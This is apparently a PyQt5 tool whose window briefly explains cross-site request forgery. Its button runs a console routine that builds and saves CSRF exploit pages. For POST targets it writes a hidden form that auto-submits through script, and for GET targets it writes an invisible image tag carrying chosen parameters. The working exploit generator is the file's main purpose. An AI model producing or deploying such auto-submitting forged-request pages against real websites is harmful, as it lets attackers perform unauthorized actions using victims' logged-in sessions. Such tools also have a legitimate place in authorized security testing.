# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'csrf.ui'
#
# Created by: PyQt5 UI code generator 5.6
#
# WARNING! All changes made in this file will be lost!

from PyQt5 import QtCore, QtGui, QtWidgets
import urllib
import urllib.parse

class csrf_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(812, 592)
        MainWindow.setStyleSheet("\n"
"background-color:rgb(0, 0, 0);\n"
"")
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(0, 0, 211, 161))
        self.label.setText("")
        self.label.setPixmap(QtGui.QPixmap(":/csrf/Cross-Site-Request-Forgery.jpg"))
        self.label.setObjectName("label")
        self.textBrowser = QtWidgets.QTextBrowser(self.centralwidget)
        self.textBrowser.setGeometry(QtCore.QRect(210, 0, 601, 161))
        self.textBrowser.setStyleSheet("background-color:qlineargradient(spread:pad, x1:0, y1:0.38, x2:0, y2:0.783, stop:0 rgba(151, 111, 0, 255), stop:1 rgba(209, 209, 0, 255));\n"
"border:none;\n"
"")
        self.textBrowser.setObjectName("textBrowser")
        self.textBrowser_2 = QtWidgets.QTextBrowser(self.centralwidget)
        self.textBrowser_2.setGeometry(QtCore.QRect(10, 190, 791, 271))
        self.textBrowser_2.setStyleSheet("background-color:rgb(25, 25, 25);\n"
"border:none;\n"
"")
        self.textBrowser_2.setObjectName("textBrowser_2")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(210, 520, 61, 31))
        self.label_2.setObjectName("label_2")
        self.lineEdit = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit.setGeometry(QtCore.QRect(280, 520, 211, 31))
        self.lineEdit.setStyleSheet("background-color:rgb(255, 255, 255);\n"
"border:rgb(0, 0, 0);")
        self.lineEdit.setObjectName("lineEdit")
        self.pushButton = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton.setGeometry(QtCore.QRect(510, 510, 51, 51))
        self.pushButton.setStyleSheet("\n"
"\n"
"QPushButton#pushButton{\n"
"background-image:url(:/arrow/129102-simple-red-square-icon-media-a-media22-arrow-forward1.png);\n"
" border-radius: 20px;\n"
"}\n"
"QPushButton#pushButton:pressed{\n"
"background-image:url(:/arrow/125220-matte-white-square-icon);\n"
"}\n"
"")
        self.pushButton.setText("")
        self.pushButton.setObjectName("pushButton")
        self.pushButton.clicked.connect(self.cross_site_resource_forgery)
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 812, 21))
        self.menubar.setObjectName("menubar")
        MainWindow.setMenuBar(self.menubar)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.textBrowser.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;\">\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p>\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-size:26pt; font-weight:600;\"><br /></p>\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-size:26pt; font-weight:600;\"><br /></p>\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p>\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:26pt; font-weight:600;\">Cross-site Request Forgery</span></p></body></html>"))
        self.textBrowser_2.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:16pt; color:#c3c3c3;\">Cross-site request forgery, also known as one-click attack or session riding and abbreviated as CSRF (sometimes pronounced sea-surf) or XSRF, is a type of malicious exploit of a website where unauthorized commands are transmitted from a user that the web application trusts.</span></p>\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-size:16pt; color:#c3c3c3;\"><br /></p>\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:16pt; color:#c3c3c3;\">There are many ways in which a malicious website can transmit such commands; specially-crafted image tags, hidden forms, and JavaScript XMLHttpRequests, for example, can all work without the user\'s interaction or even knowledge. Unlike cross-site scripting (XSS), which exploits the trust a user has for a particular site, CSRF exploits the trust that a site has in a user\'s browser.</span></p></body></html>"))
        self.label_2.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:16pt; color:#dadada;\">URL :-</span></p></body></html>"))
        self.lineEdit.setPlaceholderText(_translate("MainWindow", "www.abc.com"))

    def cross_site_resource_forgery(self):
        print("[+] Select method:")  # Printing options for HTTP methods
        print("")
        print("1.POST")
        print("2.GET")
        print("other options will be added soon.")
        print("")
        method = str(input("[+] Select 1 or 2 : "))
        print("")
        options1 = "1", "2"
        if method == "1":  # POST Method
            print("")
            action = str(input("[+] Enter 'target' URL: "))
            print("")
            exploittitle = "\n[!] Exploit:"
            formstart = "\t<form action=\"%s\" method=\"POST\" name=\"exploit\">" % (action)
            formend = "\t</form>\n\t<script>document.exploit.submit()</script>"

            # The code below asks the parameter values
            num_array = list()
            name_array = list()
            num = input("Enter how many parameters you want to enter? :")
            if num.isdigit():

                print("")
                print("Enter parameter 'Name' and 'Value': ")
                for i in range(int(num)):  # FOR loop for asking Parameter Name and Value.
                    print("")
                    n = input("Name : ")
                    n1 = input("Value: ")
                    num_array.append(str(n))
                    name_array.append(str(n1))

                print("Enter your Filename,\nNote: The exploit will be saved as 'filename'.html \n")
                extension = ".html"
                name = str(input("Filename: "))
                filename = name + extension
                file = open(filename, "w")

                file.write(formstart)
                file.write("\n")
                print(exploittitle)
                print(formstart)
                # FOR loop for printing user entered values in the final exploit.
                for x, y in zip(num_array, name_array):
                    name = str(x)
                    value = str(y)
                    finalstring = "\t<input type=\"hidden\" name=\"" + name + "\" value=\"" + value + "\">\n"
                    file.write(finalstring)
                print(formend)
                file.write(formend)
                file.close()
                print("Your exploit is saved as %s" % filename)
                print("")
            else:
                print("Invalid value!")  # GET
        if method == "2":  # GET Method
            action = str(input("[+] Enter 'target' URL(must end with /) e.g, https://www.google.com/: "))
            num = input("Enter how many parameters you want to enter? :")
            if num.isdigit():
                num_array = list()
                name_array = list()
                print("")
                print("Enter parameter 'Name' and 'Value': ")
                for i in range(int(num)):  # FOR loop for asking Parameter Name and Value.
                    print("")
                    n = input("Name : ")
                    n2 = n
                    n1 = input("Value: ")
                    n3 = n1
                    num_array.append(str(n2))
                    name_array.append(str(n3))
                finalstring = dict(zip(num_array, name_array))
                urlencoded = urllib.parse.urlencode(finalstring)

            exploittitle = "\n[!] Exploit:"
            print("")
            print(exploittitle)
            # print ("\t<img src=\"%s"+"?"+"%s"+"\" style=\"opacity:0\">"%(action, urlencoded))
            print('\t<img src="' + action + '?' + urlencoded + '" style="opacity:0">')
            jsonoutput = '''<img src=\"%s?%s\" style=\"opacity:0\">''' % (action, urlencoded)
            print("")
            print("Enter your Filename,\nNote: The exploit will be saved as 'filename'.html \n")
            extension = ".html"
            name = input("Filename: ")
            filename = name + extension
            file = open(filename, "w")

            file.write(jsonoutput)
            file.close()
            print("Your exploit is saved as %s" % filename)
            print("")

        print("")
        exittheprogram = input("Press Enter to exit.")
        exit()
        
import temp

if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = csrf_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())

